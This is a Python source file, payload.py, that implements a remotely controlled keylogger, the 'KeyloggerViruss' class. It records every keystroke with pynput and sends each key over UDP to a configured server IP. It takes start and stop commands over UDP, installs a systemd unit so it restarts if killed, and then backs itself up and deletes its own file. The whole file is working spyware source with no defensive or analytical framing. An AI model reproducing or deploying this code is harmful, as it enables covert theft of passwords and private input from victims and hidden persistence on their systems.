"""
@author: Vuong Van Duy
payload.py
data: 14.10.2025

This script implements a keylogger that listens for UDP commands to start and stop logging keystrokes.
When started, it captures keystrokes and sends them via UDP to a specified server.
It also ensures persistence by creating a systemd unit file to restart itself if terminated.
"""


from pynput.keyboard import Listener
import socket, json, os, sys
from pathlib import Path
from backup import get_file_name, _md5_of_file, self_backup_and_delete
from setup_systemd import create_systemd_unit
from config import special_keys, IP, UNIT_NAME, BACKUP_DIR_DEFAULT, UNIT_DIR


class KeyloggerViruss():
    def __init__(self, host: str = "127.0.0.1", port_listen: int = 9998, port_send: int = 9999):
        self.host = host
        self.port_listen = port_listen
        self.port_send = port_send
        self.FLAG_ACTIVE = False
        self.listener = None

    def send_udp_message(self, message: str, signal: bool = True, timeout: float = 2.0):
        """
        Send a message over UDP.
        message: bytes
        host, port: destination
        timeout: timeout for socket (optional, UDP does not have ACK)
        """
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
            sock.settimeout(timeout)
            try:
                request = {
                    "signal": signal,
                    "message": message
                }
                sent = sock.sendto(json.dumps(request).encode(), (self.host, self.port_send))
                print(f"Sent {sent} bytes to {self.host}:{self.port_send}")
            except socket.timeout:
                pass
            except Exception as e:
                pass

    def on_press(self, key):
        try:
            if key in special_keys:
                key = special_keys[key]
            else:
                key = str(key).replace("'", "")
            self.send_udp_message(message=key)
        except AttributeError:
            pass

    def start_monitor(self):
        if self.FLAG_ACTIVE:
            return

        self.listener = Listener(on_press=self.on_press, on_release=None)
        self.listener.start()
        self.FLAG_ACTIVE = True
        print("Keyboard monitor STARTED")

    def stop_monitor(self):
        if not self.FLAG_ACTIVE:
            return
        if self.listener is not None:
            self.listener.stop()
            self.listener.join(timeout=1.0)
            self.listener = None
        self.FLAG_ACTIVE = False
        print("Keyboard monitor STOPPED")

    def run_keylogger(self, buffer_size: int = 4096):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind(('0.0.0.0', self.port_listen))
        print(f"UDP server listening on {self.host}:{9998} (press Ctrl+C to stop)")

        try:
            while True:
                try:
                    data, _ = sock.recvfrom(buffer_size)
                    data = json.loads(data.decode())
                    if data.get("command", "") and not self.FLAG_ACTIVE:
                        self.start_monitor()
                    elif not data.get("command", "") and self.FLAG_ACTIVE:
                        self.stop_monitor()
                        message = "[KEYLOGGER STOPPED]"
                        signal = False
                        self.send_udp_message(message=message, signal=signal)
                        return
                except json.JSONDecodeError as e:
                    pass
                except OSError as e:
                    break
        except KeyboardInterrupt:
            print("\nReceived Ctrl+C — shutting down server gracefully.")
        finally:
            sock.close()
            print("Socket closed. Bye.")

def main():
    path_file = Path(os.path.abspath(sys.argv[0])).resolve()
    filename = get_file_name(path_file)
    filename_md5 = _md5_of_file(path_file) + '.bak'
    unit_path = os.path.expanduser(UNIT_DIR) + '/' + UNIT_NAME

    #1. Check if there is unit then stop
    if not Path(unit_path).exists():
        try:
            if not create_systemd_unit(progFileName=filename, progFileBackup=filename_md5):
                print("Error creating systemd unit.")
                return
        except PermissionError:
            print("Error: No write access")
            return

    # 2. Run keylogger
    keylogger = KeyloggerViruss(host=IP)
    keylogger.run_keylogger()
    print("End process keylogger. Deleting and creating backup...")
    # 3. Delete and create backup of itself
    try:
        if not self_backup_and_delete(backup_dir=BACKUP_DIR_DEFAULT, pathFileName=path_file):
            print("Error creating backup.")
            return
    except PermissionError:
        print("Error: No write access /var/backups/")
        return


if __name__ == "__main__":
    main()